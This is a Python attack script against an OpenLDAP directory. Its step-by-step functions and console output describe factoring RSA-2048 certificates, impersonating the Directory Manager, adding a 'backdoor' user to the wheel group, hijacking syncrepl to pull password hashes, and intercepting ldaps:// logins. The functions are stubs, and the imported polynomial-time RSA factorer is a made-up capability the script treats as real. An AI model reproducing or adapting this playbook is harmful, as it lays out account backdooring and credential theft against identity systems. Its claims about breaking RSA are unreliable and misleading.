"""
Factor the OpenLDAP slapd server RSA-2048 cert or a SASL EXTERNAL client cert
to impersonate the Directory Manager, inject forged LDAP entries that replicate
across the topology, and MitM every ldaps:// connection for credential harvest.
"""

import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import hashlib

# slapd server RSA-2048 TLS cert
SLAPD_SERVER_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."
# SASL EXTERNAL client cert for Directory Manager
DM_CLIENT_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."
# Replication (syncrepl) client cert
REPL_CLIENT_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."

LDAP_BASE_DN = "dc=corp,dc=example,dc=com"


def extract_slapd_cert(ldaps_handshake: bytes) -> bytes:
    """Extract slapd server RSA cert from any ldaps:// TLS handshake.

    Any LDAP client connecting to ldaps://ldap.corp.example.com:636
    receives the server cert in the TLS handshake.
    """
    return SLAPD_SERVER_PUBKEY_PEM


def extract_dm_client_cert(slapd_config: bytes) -> bytes:
    """Extract Directory Manager SASL EXTERNAL client cert.

    The cert is configured in slapd.conf / cn=config and often
    shared in deployment documentation or LDIF exports.
    """
    return DM_CLIENT_PUBKEY_PEM


def factor_ldap_key(pubkey_pem: bytes) -> bytes:
    """Factor the LDAP RSA-2048 key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def impersonate_directory_manager(forged_dm_privkey: bytes) -> dict:
    """Connect as Directory Manager via SASL EXTERNAL with forged cert.

    slapd extracts the subject DN from the TLS client cert and maps
    it to cn=Directory Manager. Full directory access granted.
    """
    return {
        "bind_dn": "cn=Directory Manager",
        "auth_method": "SASL EXTERNAL (forged X.509 client cert)",
        "access_level": "rootDN — full directory control",
    }


def inject_ldap_entries(entries: list) -> list:
    """Inject forged LDAP entries as Directory Manager.

    Add users, modify group memberships, change passwords.
    SSSD on Linux hosts picks up changes on next cache refresh.
    """
    results = []
    for entry in entries:
        results.append({"dn": entry["dn"], "op": entry["op"], "status": "success"})
    return results


def impersonate_syncrepl_consumer(forged_repl_privkey: bytes) -> dict:
    """Connect as a syncrepl consumer to trigger full directory sync.

    Receive a complete copy of the directory including userPassword
    hashes, then inject forged entries that replicate to all consumers.
    """
    return {
        "role": "syncrepl consumer (forged)",
        "sync_type": "refreshAndPersist",
        "data_received": "full directory including userPassword hashes",
        "injection": "forged entries replicate to all consumers",
    }


def mitm_ldap_server(forged_server_privkey: bytes) -> dict:
    """MitM ldaps:// connections using the forged server cert.

    Applications doing simple-bind over LDAP TLS send plaintext
    passwords in the BIND request. Intercept every password.
    """
    return {
        "attack": "TLS MitM on ldaps://",
        "harvested": ["service account passwords", "admin bind credentials",
                      "SSSD refresh credentials", "Kubernetes LDAP auth tokens"],
    }


if __name__ == "__main__":
    print("[1] Extracting slapd server RSA-2048 cert from ldaps:// handshake")
    server_pub = extract_slapd_cert(b"<tls-handshake>")

    print("[2] Extracting Directory Manager SASL EXTERNAL client cert")
    dm_pub = extract_dm_client_cert(b"<slapd-config>")

    print("[3] Factoring Directory Manager client cert RSA key")
    forged_dm = factor_ldap_key(dm_pub)
    print("    Directory Manager key recovered")

    print("[4] Connecting as Directory Manager via SASL EXTERNAL")
    dm_session = impersonate_directory_manager(forged_dm)
    print(f"    {dm_session}")

    print("[5] Injecting forged LDAP entries")
    entries = [
        {"dn": f"uid=backdoor,ou=People,{LDAP_BASE_DN}", "op": "add"},
        {"dn": f"cn=wheel,ou=Groups,{LDAP_BASE_DN}", "op": "modify — add backdoor to wheel"},
    ]
    results = inject_ldap_entries(entries)
    for r in results:
        print(f"    {r['dn']}: {r['op']} — {r['status']}")
    print("    SSSD picks up changes → backdoor user has sudo access")

    print("\n[6] Syncrepl replication hijack")
    repl = impersonate_syncrepl_consumer(forged_dm)
    print(f"    {repl}")

    print("\n[7] MitM ldaps:// for credential harvest")
    forged_server = factor_ldap_key(server_pub)
    mitm = mitm_ldap_server(forged_server)
    print(f"    {mitm}")

    print("\n[*] LDAP is the identity backbone for corporate Linux environments")
    print("    SASL EXTERNAL: the RSA certificate IS the credential")
